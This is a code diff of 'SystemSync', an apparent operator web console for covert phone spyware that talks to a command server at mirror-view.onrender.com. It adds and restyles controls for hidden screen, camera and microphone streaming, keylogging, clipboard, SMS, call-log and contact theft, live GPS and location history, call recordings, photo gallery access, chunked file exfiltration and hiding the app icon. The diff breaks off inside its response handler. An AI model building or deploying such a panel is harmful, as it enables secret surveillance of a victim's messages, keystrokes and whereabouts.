@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SystemSync Console</title>
+    <title>SystemSync Console · Reliable</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
         /* ---------- your existing styles (unchanged) ---------- */
@@ -362,12 +362,12 @@
             border-color:#1976ff;
         }
         img, video {
-    max-width: 100%;
-    max-height: 70vh;
-    border-radius: 8px;
-    display: block;
-    margin: 0 auto;
-}
+            max-width: 100%;
+            max-height: 70vh;
+            border-radius: 8px;
+            display: block;
+            margin: 0 auto;
+        }
         audio{
             width:100%;
             margin-top:15px;
@@ -383,88 +383,86 @@
             margin-left: 10px;
         }
 
+        .screen-container{
+            width:100%;
+            aspect-ratio:16/9;
+            background:black;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+        }
 
-.screen-container{
-    width:100%;
-    aspect-ratio:16/9;
-    background:black;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-}
-
-.screen-container video{
-    width:100%;
-    height:100%;
-    object-fit:contain;
-}
+        .screen-container video{
+            width:100%;
+            height:100%;
+            object-fit:contain;
+        }
+        
         /* ---------- MODAL / POPUP STYLES ---------- */
-.modal-overlay{
-    position:fixed;
-    inset:0;
-    background:rgba(0,0,0,0.9);
-    display:none;
-    justify-content:center;
-    align-items:center;
-    z-index:10000;
-}
+        .modal-overlay{
+            position:fixed;
+            inset:0;
+            background:rgba(0,0,0,0.9);
+            display:none;
+            justify-content:center;
+            align-items:center;
+            z-index:10000;
+        }
         .modal-overlay.show {
             display: flex;
         }
 
-        /* Outer wrapper: phone frame + control strip stacked vertically */
-        
-.mobile-popup{
-    width:min(92vw, calc(92vh * 9 / 16));
-    height:92vh;
-    display:flex;
-    flex-direction:column;
-    background:#0f0f0f;
-    border-radius:26px;
-    border:6px solid #2e2e2e;
-    box-shadow:0 40px 120px rgba(0,0,0,0.9);
-    overflow:hidden;
-}
-.phone-frame{
-    flex:1;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    background:black;
-    overflow:hidden;
-}
+        .mobile-popup{
+            width:min(92vw, calc(92vh * 9 / 16));
+            height:92vh;
+            display:flex;
+            flex-direction:column;
+            background:#0f0f0f;
+            border-radius:26px;
+            border:6px solid #2e2e2e;
+            box-shadow:0 40px 120px rgba(0,0,0,0.9);
+            overflow:hidden;
+        }
+        .phone-frame{
+            flex:1;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            background:black;
+            overflow:hidden;
+            aspect-ratio: 9 / 16;   /* enforce 9:16 ratio */
+       }
 
-.phone-frame video{
-    width:100%;
-    height:100%;
-    object-fit:contain;
-}
+        .phone-frame video{
+            width:100%;
+            height:100%;
+            object-fit:cover;
+        }
 
-        /* Control bar sits BELOW the phone frame */
-   .popup-controls{
-    flex-shrink:0;
-    background:#111;
-    padding:8px;
-    display:flex;
-    gap:6px;
-    justify-content:space-around;
-    align-items:center;
-}
-       .popup-controls button {
-    flex: 1;
-    background: #1e1e1e;
-    color: white;
-    border: none;
-    padding: 5px 0;
-    border-radius: 6px;
-    cursor: pointer;
-    font-size: 10px;               /* bigger icons */
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    transition: background 0.15s;
-    min-width: 50px;
-}
+        .popup-controls{
+            flex-shrink:0;
+            background:#111;
+            padding:8px;
+            display:flex;
+            gap:6px;
+            justify-content:space-around;
+            align-items:center;
+        }
+        .popup-controls button {
+            width: 60px;        /* fixed width */
+            height: 28px;       /* fixed height */
+            font-size: 12px;    /* fixed font size */
+            flex: none;         /* prevents flex resizing */
+            background: #1e1e1e;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.15s;
+  }
         .popup-controls button:hover {
             background: #3a3a3c;
             transform: scale(1.05);
@@ -486,15 +484,61 @@
             background: #505052;
         }
 
-        /* blur background when modal is open */
         body.modal-open #sidebar,
         body.modal-open #main {
             pointer-events: none;
             filter: blur(4px);
             transition: filter 0.3s;
         }
+        
+        .ws-debug {
+            font-size: 11px;
+            color: #666;
+            margin-top: 6px;
+            display: none;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background-color: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background-color: #4caf50;
+            transition: width 0.3s ease;
+        }
+        
+        .usage-bar {
+            height: 10px;
+            border-radius: 5px;
+            background-color: #1976ff;
+        }
+        
+        .app-usage-item {
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            border-bottom: 1px solid #eef2f5;
+        }
+        
+        .app-usage-name {
+            flex: 1;
+            font-weight: 500;
+        }
+        
+        .app-usage-time {
+            width: 80px;
+            text-align: right;
+            color: #666;
+        }
     </style>
 </head>
+   
 <body>
 
 <!-- MODAL OVERLAY (for screen share) -->
@@ -502,7 +546,7 @@
     <div class="mobile-popup">
         <div class="phone-frame">
             <div class="screen-container">
-            <video id="modalScreenVideo" autoplay playsinline></video>
+                <video id="modalScreenVideo" autoplay playsinline></video>
             </div>
         </div>
         <div class="popup-controls">
@@ -515,7 +559,7 @@
 </div>
 
 <div id="sidebar">
-    <div class="logo">SystemSync</div>
+    <div class="logo">SystemSync 🔗</div>
 
     <div class="section">
         <div class="section-title">Surveillance</div>
@@ -570,12 +614,17 @@
     <div class="section">
         <div class="section-title">Monitoring</div>
         <button onclick="showAppUsagePanel()"><span>📊</span> Screen Time</button>
-        <button onclick="sendCommand('GET_NOTIFICATIONS')"><span>🔔</span> Social Messages</button>
+        <button onclick="showSocialMessagesPanel()"><span>💬</span> Social Messages</button>
         <button onclick="sendCommand('GET_KEYLOG')"><span>⌨️</span> Keyboard Log</button>
         <button onclick="sendCommand('GET_CLIPBOARD')"><span>📋</span> Clipboard</button>
         <button onclick="showGeofencePanel()"><span>🗺️</span> Geofence</button>
         <button onclick="showSchedulePanel()"><span>⏱️</span> Auto Capture</button>
         <button onclick="toggleLiveGps()" id="liveGpsBtn"><span>🛰️</span> <span>Live GPS Track</span></button>
+        <button onclick="showLocationHistoryPanel()"><span>📍</span> Location History</button>
+        <button onclick="showCallRecordingsPanel()"><span>🎙️</span> Call Recordings</button>
+        <button onclick="showPhotoGalleryPanel()"><span>🖼️</span> Photo Gallery</button>
+        <button onclick="showAppEventsPanel()"><span>📦</span> App Events</button>
+        <button onclick="showSmsKeywordsPanel()"><span>🔑</span> SMS Keywords</button>
     </div>
 
     <div class="section">
@@ -584,6 +633,12 @@
         <button onclick="sendCommand('LOCK_DEVICE')"><span>🔒</span> Lock Screen</button>
         <button onclick="showSendSmsPanel()"><span>✉️</span> Send SMS</button>
         <button onclick="sendCommand('VIBRATE', { duration: 1000 })"><span>📳</span> Vibrate (1s)</button>
+        <!-- Single Flash Toggle Button -->
+        <button onclick="toggleFlash()"><span>🔦</span> <span id="flashBtn">Flash On</span></button>
+        <!-- Flash Timed and Flash Blink remain separate -->
+        <button onclick="sendCommand('FLASH_TIMED', { duration: 5000 })"><span>⏱️</span> Flash 5s</button>
+        <button onclick="sendCommand('FLASH_BLINK', { duration: 10000, interval: 500 })"><span>✨</span> Flash Blink</button>
+        <button onclick="showFirebaseSettingsPanel()" style="border-left:3px solid #ff6f00"><span>🔥</span> Firebase Setup</button>
     </div>
 
     <div id="alertsBadge" style="margin:10px 0;display:none;">
@@ -593,19 +648,29 @@
             <button onclick="clearAlerts()" style="margin-top:6px;font-size:11px;padding:3px 8px;background:#ff9800;color:#fff;border:none;border-radius:4px;cursor:pointer;">Clear</button>
         </div>
     </div>
+    <div class="ws-debug" id="wsDebug">🌐 WebSocket: idle</div>
 </div>
 
 <div id="main">
     <div id="header">
-        <div>Control Panel</div>
+        <div>Control Panel <span style="font-size:12px; margin-left:8px; color:#1976ff;" id="serverInfo">mirror-view.onrender.com</span></div>
         <div style="display: flex; align-items: center;">
             <span id="status">CONNECTING</span>
-            <button class="reconnect-btn" onclick="connectWebSocket()">⟲ Reconnect</button>
+            <button class="reconnect-btn" onclick="manualReconnect()">⟲ Reconnect</button>
         </div>
+    </div>
+     <div id="downloadProgress" style="display: none; background: #fff; border: 1px solid #1976ff; border-radius: 8px; padding: 10px; margin-bottom: 10px;">
+    <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
+        <span id="progressFileName">Downloading...</span>
+        <span id="progressPercent">0%</span>
+    </div>
+    <div style="width: 100%; background: #e0e0e0; border-radius: 4px;">
+        <div id="progressBar" style="width: 0%; height: 10px; background: #1976ff; border-radius: 4px;"></div>
+    </div>
     </div>
     <div id="content">
         <div id="main-panel">
-            Ready. Click any button to send command.
+            🔌 Initializing connection... <br><small>Ensure the target device is online and server is reachable.</small>
         </div>
     </div>
 </div>
@@ -613,16 +678,23 @@
 <!-- Leaflet -->
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<script type="module">
+<!-- Firebase SDK v10 -->
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
+<script>
     // ---------- GLOBALS ----------
     const WS_URL = "wss://mirror-view.onrender.com";
     let ws = null;
+    let reconnectTimer = null;
+    let reconnectAttempts = 0;
+    const MAX_RECONNECT_DELAY = 30000;
 
     // WebRTC peer connections
     let screenPC = null;
     let cameraPC = null;
     let audioPC = null;
-
+    let fileTransfers = {}; // key: transferId, value: { chunks: [], totalChunks, fileName, fileSize, path }
     // UI state
     let mapInstance = null;
     let currentData = [];
@@ -632,6 +704,7 @@
     let selectedFiles = [];
     let screenActive = false;
     let iconHidden = false;
+    let flashOn = false; // track flash state
 
     // Live camera recording state
     let mediaRecorder = null;
@@ -639,40 +712,31 @@
 
     // Track the last command sent to interpret raw responses
     let pendingCommand = null;
+    let currentDeviceId = null;
 
     const panel = document.getElementById('main-panel');
     const statusEl = document.getElementById('status');
+    const wsDebug = document.getElementById('wsDebug');
 
     // Modal elements
     const modalOverlay = document.getElementById('screenModalOverlay');
     const modalVideo = document.getElementById('modalScreenVideo');
-modalVideo.addEventListener("loadedmetadata", () => {
-
-    const w = modalVideo.videoWidth;
-    const h = modalVideo.videoHeight;
-
-    const popup = document.querySelector(".mobile-popup");
-
-    if (h > w) {
-        // Portrait phone
-        popup.style.aspectRatio = "9 / 16";
-    } else {
-        // Landscape screen
-        popup.style.aspectRatio = "16 / 9";
-    }
-
-});
     
     const modalSnapBtn = document.getElementById('modalSnapBtn');
     const modalRecordBtn = document.getElementById('modalRecordBtn');
     const modalFullscreenBtn = document.getElementById('modalFullscreenBtn');
     const modalCloseBtn = document.getElementById('modalCloseBtn');
-   
+    
+    let liveGpsActive = false;
+    const newAlerts = [];
+    let appsData = [];
+
     function getFormattedDateTime() {
         const d = new Date();
         const pad = (n) => n.toString().padStart(2, '0');
         return `${pad(d.getDate())}-${pad(d.getMonth()+1)}-${d.getFullYear()}-${pad(d.getHours())}-${pad(d.getMinutes())}-${pad(d.getSeconds())}`;
     }
+
     // ---------- ICE SERVERS ----------
     const ICE_SERVERS = [
         { urls: "stun:stun.relay.metered.ca:80" },
@@ -690,6 +754,7 @@ modalVideo.addEventListener("loadedmetadata", () => {
         }
         const payload = {
             type: 'SIGNALING',
+            deviceId: currentDeviceId,
             data: msg
         };
         ws.send(JSON.stringify(payload));
@@ -700,7 +765,6 @@ modalVideo.addEventListener("loadedmetadata", () => {
     function createPeerConnection(streamType, onTrackCallback, useMic = false) {
         const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
 
-        // Add transceivers to receive media
         if (streamType === 'screen') {
             pc.addTransceiver('video', { direction: 'recvonly' });
         } else if (streamType === 'camera') {
@@ -728,7 +792,6 @@ modalVideo.addEventListener("loadedmetadata", () => {
                 if (streamType === 'screen') {
                     screenActive = false;
                     document.getElementById('screenBtn').innerText = 'Start Screen';
-                    // Also close modal if it's open
                     closeScreenModal();
                 }
             }
@@ -739,7 +802,6 @@ modalVideo.addEventListener("loadedmetadata", () => {
         return pc;
     }
 
-    // Helper to get the correct peer connection based on stream type
     function getPCForType(type) {
         if (type === 'screen') return screenPC;
         if (type === 'camera') return cameraPC;
@@ -760,58 +822,51 @@ modalVideo.addEventListener("loadedmetadata", () => {
             const pc = getPCForType(msg.streamType);
             if (pc && msg.candidate) {
                 pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e => console.error('Error adding ICE candidate:', e));
-                console.log('ICE candidate added for', msg.streamType);
             }
         }
     }
 
     // ---------- MODAL CONTROL ----------
-   function openScreenModal() {
-    modalOverlay.classList.add('show');
-    document.body.classList.add('modal-open');
-    // Reset recording button to red dot
-    modalRecordBtn.innerText = '🔴';          // red dot = start recording
-    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
-        screenMediaRecorder.stop();
+    function openScreenModal() {
+        modalOverlay.classList.add('show');
+        document.body.classList.add('modal-open');
+        modalRecordBtn.innerText = '🔴';
+        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+            screenMediaRecorder.stop();
+        }
+        screenMediaRecorder = null;
+        screenRecordedChunks = [];
     }
-    screenMediaRecorder = null;
-    screenRecordedChunks = [];
-}
 
     function closeScreenModal() {
-    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
-        screenMediaRecorder.stop();
+        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+            screenMediaRecorder.stop();
+        }
+        modalOverlay.classList.remove('show');
+        document.body.classList.remove('modal-open');
+        if (screenActive) {
+            toggleScreen();
+        }
+        modalRecordBtn.innerText = '🔴';
     }
-    modalOverlay.classList.remove('show');
-    document.body.classList.remove('modal-open');
-    if (screenActive) {
-        toggleScreen();
-    }
-    // Reset record button (in case it was left in green state)
-    modalRecordBtn.innerText = '🔴';
-}
 
-    // ---------- SCREEN SHARE (modified for modal) ----------
+    // ---------- SCREEN SHARE ----------
     async function toggleScreen() {
         console.log('toggleScreen called, current screenActive:', screenActive);
         if (screenActive) {
-            // Stop screen share
             if (screenPC) {
                 screenPC.close();
                 screenPC = null;
             }
             document.getElementById('screenBtn').innerText = 'Start Screen';
             screenActive = false;
-            closeScreenModal(); // close the modal
+            closeScreenModal();
             sendSignalingMessage({ type: 'STOP_SCREEN' });
         } else {
-            // Start screen share - open modal first (video will appear when track arrives)
             openScreenModal();
-            // Clear any previous video source
             modalVideo.srcObject = null;
 
             screenPC = createPeerConnection('screen', (e) => {
-                // When track arrives, attach to modal video
                 modalVideo.srcObject = e.streams[0];
                 console.log('ontrack for screen', e.streams);
             }, false);
@@ -835,7 +890,7 @@ modalVideo.addEventListener("loadedmetadata", () => {
         }
     }
 
-    // ---------- SNAP SCREEN (from modal) ----------
+    // ---------- SNAP SCREEN ----------
     function snapScreenFromModal() {
         if (!modalVideo || !modalVideo.videoWidth) {
             alert('No active screen share or video not ready');
@@ -855,60 +910,61 @@ modalVideo.addEventListener("loadedmetadata", () => {
         }, 'image/png');
     }
 
-    // ---------- RECORD SCREEN (from modal) ----------
+    // ---------- RECORD SCREEN ----------
     let screenMediaRecorder = null;
     let screenRecordedChunks = [];
 
     function toggleScreenRecording() {
-    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
-        screenMediaRecorder.stop();
-        modalRecordBtn.innerText = '🔴';      // back to red dot
-    } else {
-        if (!modalVideo.srcObject) {
-            alert('Phone Screen Off');
-            return;
-        }
-        screenRecordedChunks = [];
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        const stream = modalVideo.srcObject;
-
-        if (modalVideo.videoWidth === 0) {
-            modalVideo.onloadedmetadata = () => startScreenRecording(canvas, ctx, stream);
+        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+            screenMediaRecorder.stop();
+            modalRecordBtn.innerText = '🔴';
         } else {
-            startScreenRecording(canvas, ctx, stream);
+            if (!modalVideo.srcObject) {
+                alert('Phone Screen Off');
+                return;
+            }
+            screenRecordedChunks = [];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const stream = modalVideo.srcObject;
+
+            if (modalVideo.videoWidth === 0) {
+                modalVideo.onloadedmetadata = () => startScreenRecording(canvas, ctx, stream);
+            } else {
+                startScreenRecording(canvas, ctx, stream);
+            }
         }
     }
-}
 
     function startScreenRecording(canvas, ctx, originalStream) {
-    canvas.width = modalVideo.videoWidth;
-    canvas.height = modalVideo.videoHeight;
+        canvas.width = modalVideo.videoWidth;
+        canvas.height = modalVideo.videoHeight;
 
-    function drawVideoFrame() {
-        ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
-        requestAnimationFrame(drawVideoFrame);
+        function drawVideoFrame() {
+            ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
+            requestAnimationFrame(drawVideoFrame);
+        }
+        drawVideoFrame();
+
+        const canvasStream = canvas.captureStream(30);
+        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
+
+        screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
+        screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
+        screenMediaRecorder.onstop = () => {
+            const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `screenVideo-${getFormattedDateTime()}.webm`;
+            a.click();
+            URL.revokeObjectURL(url);
+            canvasStream.getTracks().forEach(track => track.stop());
+        };
+        screenMediaRecorder.start();
+        modalRecordBtn.innerText = '🟢';
     }
-    drawVideoFrame();
 
-    const canvasStream = canvas.captureStream(30);
-    originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
-
-    screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
-    screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
-    screenMediaRecorder.onstop = () => {
-        const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `screenVideo-${getFormattedDateTime()}.webm`;
-        a.click();
-        URL.revokeObjectURL(url);
-        canvasStream.getTracks().forEach(track => track.stop());
-    };
-    screenMediaRecorder.start();
-    modalRecordBtn.innerText = '🟢';          // green dot = stop recording
-}
     // Fullscreen toggle
     function toggleFullscreen() {
         if (!document.fullscreenElement) {
@@ -931,11 +987,13 @@ modalVideo.addEventListener("loadedmetadata", () => {
         const useMic = document.getElementById('liveMicCheckbox').checked;
 
         panel.innerHTML = `
-            <video id="liveCamVideo" autoplay playsinline></video>
-            <div class="live-controls">
-                <button onclick="takeSnapshot()" id="snapshotBtn">Take Snapshot</button>
-                <button onclick="toggleRecording()" id="recordBtn">Record Video</button>
-                <button class="stop" onclick="stopLiveStream()">Stop</button>
+            <div style="position:relative;">
+                <video id="liveCamVideo" autoplay playsinline style="width:100%; max-height:500px; background:#000;"></video>
+                <div class="live-controls" style="margin-top:10px;">
+                    <button onclick="takeSnapshot()" id="snapshotBtn" style="background:#1976ff;">📸 Snapshot</button>
+                    <button onclick="toggleRecording()" id="recordBtn" style="background:#ff9800;">🔴 Record</button>
+                    <button class="stop" onclick="stopLiveStream()" style="background:#d32f2f;">⏹ Stop</button>
+                </div>
             </div>
         `;
 
@@ -1023,10 +1081,10 @@ modalVideo.addEventListener("loadedmetadata", () => {
         panel.innerHTML = 'Ready.';
     }
 
-    // ---------- COMMAND SENDING (JSON) ----------
+    // ---------- COMMAND SENDING ----------
     function sendCommand(command, params = {}) {
         if (!ws || ws.readyState !== WebSocket.OPEN) {
-            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
+            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. <a href="#" onclick="manualReconnect()">Reconnect</a>.</div>`;
             return;
         }
         const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
@@ -1035,85 +1093,243 @@ modalVideo.addEventListener("loadedmetadata", () => {
             command: command,
             requestId: requestId,
             params: params,
+            deviceId: currentDeviceId,
             timestamp: Date.now()
         };
         ws.send(JSON.stringify(payload));
-        panel.innerHTML = `📤 Command sent: ${command}`;
+        panel.innerHTML = `<div style="color:#1976ff;">📤 Command sent: ${command}</div>`;
         pendingCommand = command;
+        console.log('Sent command:', command, params);
         setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
     }
 
-    // ---------- PLAIN TEXT SENDING (for hideApp/showApp and file downloads) ----------
+    // ---------- PLAIN TEXT SENDING ----------
     function sendPlainText(msg) {
         if (!ws || ws.readyState !== WebSocket.OPEN) {
-            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
+            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected.</div>`;
             return;
         }
         ws.send(msg);
-        panel.innerHTML = `📤 Plain text sent: ${msg}`;
+        panel.innerHTML = `<div style="color:#1976ff;">📤 Plain text sent: ${msg}</div>`;
     }
 
-    // ---------- PLAIN TEXT / JSON HANDLERS ----------
+    // ---------- JSON RESPONSE HANDLER ----------
     function handleJSON(json) {
         console.log('handleJSON:', json.type, json);
-        switch (json.type) {
-            case 'SMS_DATA':
-                console.log('📩 SMS_DATA received', json.data);
+        
+        if (json.deviceId) {
+            currentDeviceId = json.deviceId;
+        }
+        
+        // Handle array responses (from plain text fallback)
+        if (Array.isArray(json)) {
+            if (pendingCommand === 'GET_SMS') {
                 dataType = 'sms';
-                currentData = json.data;
+                currentData = json;
                 renderTable();
-                pendingCommand = null;
-                break;
-            case 'CALL_LOGS':
+            } else if (pendingCommand === 'GET_CALL_LOGS') {
                 dataType = 'call';
-                currentData = json.data;
+                currentData = json;
                 renderTable();
-                pendingCommand = null;
-                break;
-            case 'FILE_LIST':
+            } else if (pendingCommand === 'LIST_FILES') {
                 dataType = 'file';
-                currentData = json.data;
+                currentData = json;
                 renderFiles();
+            }
+            pendingCommand = null;
+            return;
+        }
+        
+        // Handle JSON responses by type
+        switch (json.type) {
+            // Basic responses
+            case 'SMS_DATA':
+                try {
+                    const smsData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    dataType = 'sms';
+                    currentData = Array.isArray(smsData) ? smsData : [];
+                    renderTable();
+                } catch (e) {
+                    console.error('SMS parse error:', e);
+                    showNotification('Error parsing SMS data');
+                }
                 pendingCommand = null;
                 break;
+                
+            case 'CALL_LOGS':
+                try {
+                    const callData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    dataType = 'call';
+                    currentData = Array.isArray(callData) ? callData : [];
+                    renderTable();
+                } catch (e) {
+                    console.error('Call logs parse error:', e);
+                }
+                pendingCommand = null;
+                break;
+                
+            case 'FILE_LIST':
+                try {
+                    const fileData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    dataType = 'file';
+                    currentData = Array.isArray(fileData) ? fileData : [];
+                    renderFiles();
+                } catch (e) {
+                    console.error('File list parse error:', e);
+                }
+                pendingCommand = null;
+                break;
+          case 'FILE_INFO':
+                // Pre‑allocate array with the exact length
+                fileTransfers[json.transferId] = {
+                    chunks: new Array(json.totalChunks),
+                    totalChunks: json.totalChunks,
+                    fileName: json.fileName,
+                    fileSize: json.fileSize,
+                    path: json.path,
+                    received: 0
+                };
+                // Show progress bar
+                document.getElementById('progressFileName').innerText = json.fileName;
+                document.getElementById('progressPercent').innerText = '0%';
+                document.getElementById('progressBar').style.width = '0%';
+                document.getElementById('downloadProgress').style.display = 'block';
+                console.log(`📁 Receiving file: ${json.fileName} (${json.totalChunks} chunks)`);
+                pendingCommand = null;
+                break;
+            case 'FILE_CHUNK':
+                const transfer = fileTransfers[json.transferId];
+                if (!transfer) {
+                    console.warn('Unknown transfer ID:', json.transferId);
+                    return;
+                }
+            
+                // Defer the heavy decoding and UI update to avoid blocking the event loop
+                setTimeout(() => {
+                    try {
+                        // Decode base64 chunk to binary
+                        const binaryString = atob(json.data);
+                        const bytes = new Uint8Array(binaryString.length);
+                        for (let i = 0; i < binaryString.length; i++) {
+                            bytes[i] = binaryString.charCodeAt(i);
+                        }
+            
+                        // Store the decoded chunk
+                        transfer.chunks[json.chunkIndex] = bytes;
+                        transfer.received++;
+            
+                        // Update progress bar
+                        const percent = Math.round((transfer.received / transfer.totalChunks) * 100);
+                        document.getElementById('progressPercent').innerText = percent + '%';
+                        document.getElementById('progressBar').style.width = percent + '%';
+            
+                        // If all chunks received, assemble and download
+                        if (transfer.received === transfer.totalChunks) {
+                            console.log(`✅ All chunks received for ${transfer.fileName}`);
+            
+                            // Create a Blob from the array of Uint8Arrays and trigger download
+                            const blob = new Blob(transfer.chunks, { type: 'application/octet-stream' });
+                            const url = URL.createObjectURL(blob);
+                            const a = document.createElement('a');
+                            a.href = url;
+                            a.download = transfer.fileName;
+                            a.click();
+                            URL.revokeObjectURL(url);
+            
+                            // Clean up
+                            delete fileTransfers[json.transferId];
+                            document.getElementById('downloadProgress').style.display = 'none';
+                            showNotification(`✅ Downloaded: ${transfer.fileName}`);
+                        }
+                    } catch (e) {
+                        console.error('Chunk decode error:', e);
+                        showNotification('❌ Chunk decode error');
+                        delete fileTransfers[json.transferId];
+                        document.getElementById('downloadProgress').style.display = 'none';
+                    }
+                }, 0);
+            
+                pendingCommand = null;
+                break;
+                        
+            case 'FILE_TRANSFER_STARTED':
+                showNotification('File transfer started');
+                pendingCommand = null;
+                break;
+                
             case 'LOCATION_UPDATE':
-                renderMap(json.data);
+                // Handle both formats - direct object or nested in data
+                const locationData = json.data || json;
+                renderMap(locationData);
                 pendingCommand = null;
                 break;
             case 'CAMERA_IMAGE':
                 displayCapturedImage(json.data);
                 pendingCommand = null;
                 break;
+                
             case 'AUDIO_RECORDING':
                 showAudio(json.data);
                 pendingCommand = null;
                 break;
+                
             case 'ERROR':
-                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
+                panel.innerHTML = `<div style="color:#d32f2f;">❌ Error: ${json.error}</div>`;
                 pendingCommand = null;
                 break;
+                
             case 'DEVICE_STATUS':
                 setStatus(json.status);
                 pendingCommand = null;
                 break;
+                
+            // Flashlight commands
+            case 'FLASH_ON':
+                flashOn = true;
+                document.getElementById('flashBtn').innerText = 'Flash Off';
+                showNotification('🔦 Flashlight ON');
+                pendingCommand = null;
+                break;
+                
+            case 'FLASH_OFF':
+                flashOn = false;
+                document.getElementById('flashBtn').innerText = 'Flash On';
+                showNotification('🔦 Flashlight OFF');
+                pendingCommand = null;
+                break;
+
+            case 'FLASH_TIMED':
+                showNotification('⏱️ Flash timed complete');
+                pendingCommand = null;
+                break;
+                
+            case 'FLASH_BLINK':
+                showNotification('✨ Flash blink complete');
+                pendingCommand = null;
+                break;
+
             case 'APP_HIDDEN':
                 iconHidden = true;
                 document.getElementById('iconBtn').innerText = 'Show Icon';
                 showNotification('App icon hidden');
                 pendingCommand = null;
                 break;
+            
             case 'APP_SHOWN':
                 iconHidden = false;
                 document.getElementById('iconBtn').innerText = 'Hide Icon';
                 showNotification('App icon shown');
                 pendingCommand = null;
-                break;
+                break;   
+
+            // Screen share
             case 'SCREEN_SHARE_STARTED':
                 screenActive = true;
                 document.getElementById('screenBtn').innerText = 'Stop Screen';
                 showNotification('Screen share started');
                 pendingCommand = null;
                 break;
+                
             case 'SCREEN_SHARE_STOPPED':
                 screenActive = false;
                 document.getElementById('screenBtn').innerText = 'Start Screen';
@@ -1121,91 +1337,171 @@ modalVideo.addEventListener("loadedmetadata", () => {
                 showNotification('Screen share stopped');
                 pendingCommand = null;
                 break;
+                
+            // Data responses
             case 'CONTACTS_DATA':
-                displayContacts(parseData(json.data));
+                try {
+                    const contactsData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayContacts(contactsData);
+                } catch (e) {
+                    console.error('Contacts parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'INSTALLED_APPS':
-                displayInstalledApps(parseData(json.data));
+                try {
+                    const appsData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayInstalledApps(appsData);
+                } catch (e) {
+                    console.error('Apps parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'APP_USAGE_DATA':
-                displayAppUsage(parseData(json.data));
+                try {
+                    const usageData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayAppUsage(usageData);
+                } catch (e) {
+                    console.error('App usage parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'NOTIFICATIONS_DATA':
-                displayNotifications(parseData(json.data));
+                try {
+                    const notifData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayNotifications(notifData);
+                } catch (e) {
+                    console.error('Notifications parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'NOTIFICATIONS_CLEARED':
                 showNotification('Notifications cleared');
+                pendingCommand = null;
                 break;
+                
             case 'BROWSER_HISTORY_DATA':
-                displayBrowserHistory(parseData(json.data));
+                try {
+                    const historyData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayBrowserHistory(historyData);
+                } catch (e) {
+                    console.error('History parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'KEYLOG_DATA':
-                displayKeylog(parseData(json.data));
+                try {
+                    const keylogData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayKeylog(keylogData);
+                } catch (e) {
+                    console.error('Keylog parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
